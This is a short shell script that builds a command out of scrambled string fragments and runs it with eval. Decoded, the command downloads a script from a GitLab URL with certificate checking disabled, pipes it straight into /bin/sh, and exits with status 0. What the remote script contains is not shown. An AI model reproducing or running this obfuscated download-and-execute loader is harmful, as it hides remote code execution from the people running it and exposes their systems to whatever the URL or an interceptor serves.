z="
";Kz='lab.';cz=' 0';Pz='mage';Gz='cate';Dz='heck';Yz=' | /';Fz='tifi';Nz='nabi';Az='wget';Uz='-15.';Sz='main';bz='exit';Lz='com/';Mz='emil';az='sh';Jz='/git';Hz=' htt';Xz='-O -';Zz='bin/';Qz='s/-/';Tz='/vti';Oz='l1/i';Ez='-cer';Wz='.sh ';Bz='  --';Iz='ps:/';Cz='no-c';Rz='raw/';Vz='0.02';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"